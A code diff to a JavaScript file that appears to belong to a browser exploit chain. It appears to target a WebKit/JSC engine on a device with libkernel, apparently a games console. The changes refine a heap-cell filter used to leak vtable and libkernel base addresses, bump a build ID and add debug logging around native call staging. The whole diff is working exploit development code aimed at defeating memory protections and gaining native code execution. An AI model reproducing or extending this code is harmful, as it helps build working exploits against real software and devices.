@@ -46,12 +46,13 @@ import {
     resolveLibkernelRelroChunk,
     verifyLibkernelBase,
     extPtrToLkCandidates,
+    plausibleHeapCell,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831h";
+const BUILD_ID = "rw-20250831i";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -400,7 +401,7 @@ function pairCellsForLk() {
     for (let i = 0; i < fields.length; i++) {
         const v = pairStatus[fields[i][0]];
         if (v == null || v === -1) continue;
-        if (typeof v.hi === "number" && v.hi < 0x8) continue;
+        if (!plausibleHeapCell(v)) continue;
         out.push({ label: fields[i][1], cell: v });
     }
     return out;
@@ -2038,12 +2039,14 @@ function finishFindLkChunk(chunk) {
             + " belowPages=" + (chunk.belowPages != null ? chunk.belowPages : 0)
             + (chunk.vtable ? " vt=" + chunk.vtable : " vt=none"));
         mark("LK-GOT-MISS", (chunk.error || chunk.phase || "miss") + " build=" + BUILD_ID);
+        if (chunk.cellDbg && chunk.cellDbg.length)
+            mark("LK-CELL-DBG", chunk.cellDbg.join(" | "));
         if (chunk.known > 0 && chunk.vtExt === 0 && chunk.cells === 0) {
             mark("LK-HINT", "known=" + chunk.known
-                + " = hardcoded cal ptrs (not live vtable) — need cells>0 for vt-ready");
+                + " hardcoded cal ptrs — cells=0 was hi<0x8 filter bug (fixed 31i)");
         } else {
             mark("LK-HINT", chunk.cells === 0
-                ? "no textarea cell — re-run Start (31h adds expm1/fresh.ta fallback)"
+                ? "no textarea cell — re-run Start; check LK-CELL-DBG"
                 : (chunk.vtCount === 0
                     ? "no vtable chain — try cal index for CELL-SCAN lines"
                     : "ext ptrs found but no lk base — paste LK-EXT to hex + Verify lk"));
@@ -2117,7 +2120,11 @@ async function runFindLkAuto(preset) {
             else if (chunk.phase === "vt-ready")
                 mark("LK-GOT", "vtable " + chunk.vtable
                     + " n=" + (chunk.vtCount || 1) + " cells=" + (chunk.cells || "?")
-                    + " " + (chunk.label || ""));
+                    + " " + (chunk.label || "")
+                    + (chunk.cellDbg && chunk.cellDbg.length
+                        ? " dbg=" + chunk.cellDbg.join(" | ") : ""));
+            else if (chunk.phase === "vt-miss" && chunk.cellDbg && chunk.cellDbg.length)
+                mark("LK-CELL-DBG", chunk.cellDbg.join(" | "));
             else if (chunk.phase === "vt-done")
                 mark("LK-GOT", "vtable done ext=" + (chunk.ext || 0)
                     + " cells=" + (chunk.cells != null ? chunk.cells : "?")
